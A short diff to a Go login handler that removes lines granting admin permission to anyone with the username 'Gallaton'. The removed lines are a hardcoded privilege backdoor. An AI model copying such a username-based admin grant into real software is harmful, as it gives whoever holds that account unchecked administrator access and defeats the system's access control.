@@ -97,9 +97,6 @@ func (Env env) userVerification(w http.ResponseWriter, r *http.Request) {
 		log.Println("DB Err", err)
 		return
 	}
-	if userReturn.UserName == "Gallaton" {
-		userReturn.UserPermission = "admin"
-	}
 	err = bcrypt.CompareHashAndPassword([]byte(dbPassHash), []byte(user.PasswordString))
 	if err == bcrypt.ErrMismatchedHashAndPassword {
 		w.WriteHeader(http.StatusForbidden)
